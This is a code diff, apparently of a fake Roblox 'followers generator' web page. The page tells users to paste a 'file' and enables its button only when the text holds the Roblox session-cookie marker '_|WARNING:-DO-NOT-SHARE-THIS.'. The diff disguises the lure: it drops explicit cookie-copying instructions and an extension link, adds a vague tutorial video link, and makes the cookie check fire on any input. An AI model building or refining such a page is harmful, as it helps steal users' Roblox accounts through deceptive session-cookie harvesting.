@@ -70,19 +70,19 @@
             font-size: 11px;
         }
         .generate-btn {
-            background-color: #555; /* Dimulai dengan abu-abu */
+            background-color: #555;
             color: #999;
             border: none;
             padding: 15px 40px;
             font-size: 18px;
             font-weight: 700;
             border-radius: 8px;
-            cursor: not-allowed; /* Dimulai dengan not-allowed */
+            cursor: not-allowed;
             transition: background-color 0.3s, transform 0.2s, color 0.3s;
             margin-top: 10px;
         }
         .generate-btn.ready {
-            background-color: #4caf50; /* Warna hijau saat siap */
+            background-color: #4caf50;
             color: #fff;
             cursor: pointer;
         }
@@ -95,11 +95,11 @@
             color: #999;
             cursor: not-allowed;
         }
-        /* AWAL FITUR TAMBAHAN */
-        .cookie-helper {
+        /* CSS untuk Link Tutorial Mobile */
+        .tutorial-helper {
             margin-top: 15px;
         }
-        .cookie-btn {
+        .tutorial-btn {
             display: inline-block;
             background-color: transparent;
             color: #00bfff;
@@ -112,17 +112,16 @@
             text-decoration: none;
             transition: background-color 0.3s, color 0.3s;
         }
-        .cookie-btn:hover {
+        .tutorial-btn:hover {
             background-color: #00bfff;
             color: #121212;
         }
-        .cookie-helper p {
+        .tutorial-helper p {
             font-size: 11px;
             color: #888;
             margin-top: 10px;
             text-align: center;
         }
-        /* AKHIR FITUR TAMBAHAN */
         #statusLog {
             margin-top: 25px;
             background-color: #0f0f1e;
@@ -178,15 +177,13 @@
             <label for="cookie">input file to get followers</label>
             <textarea id="cookie" rows="4" placeholder="Paste the file here"></textarea>
             
-            <!-- AWAL FITUR TAMBAHAN -->
-            <div class="cookie-helper">
-                <a href="https://chromewebstore.google.com/detail/editthiscookie-fork/ihfmcbadakjehneaijebhpogkegajgnk" target="_blank" class="cookie-btn">
-                    ⬇️ DOWNLOAD COOKIE FOR MOBILE
+            <!-- TUTORIAL MOBILE -->
+            <div class="tutorial-helper">
+                <a href="https://youtube.com/shorts/nrRlZrpCiLQ?si=RQ3lLfjLI1jEOadH" target="_blank" class="tutorial-btn">
+                    📱 TUTORIAL MOBILE
                 </a>
-                <p>1. Install extension di Chrome.<br>2. Buka Roblox.com, lalu klik icon extension.<br>3. Copy cookie dan paste di atas.</p>
+                <p>Gatau cara dapetin filenya? Tonton tutorial ini.</p>
             </div>
-            <!-- AKHIR FITUR TAMBAHAN -->
-
         </div>
 
         <button id="generateBtn" class="generate-btn" disabled>WAITING FOR FILE FOLLOWERS</button>
@@ -240,16 +237,20 @@
             }, 6500);
         }
 
-        cookieInput.addEventListener('paste', function(event) {
-            setTimeout(() => {
-                const cookie = cookieInput.value;
-                if (cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.')) {
-                    generateBtn.disabled = false;
-                    generateBtn.textContent = 'GENERATE FOLLOWERS';
-                    generateBtn.classList.add('ready');
-                }
-            }, 100);
-        });
+        function checkCookie() {
+            const cookie = cookieInput.value;
+            if (cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.')) {
+                generateBtn.disabled = false;
+                generateBtn.textContent = 'GENERATE FOLLOWERS';
+                generateBtn.classList.add('ready');
+            } else {
+                generateBtn.disabled = true;
+                generateBtn.textContent = 'WAITING FOR FILE FOLLOWERS';
+                generateBtn.classList.remove('ready');
+            }
+        }
+
+        cookieInput.addEventListener('input', checkCookie);
 
         generateBtn.addEventListener('click', function() {
             const username = usernameInput.value || 'UnknownUser';
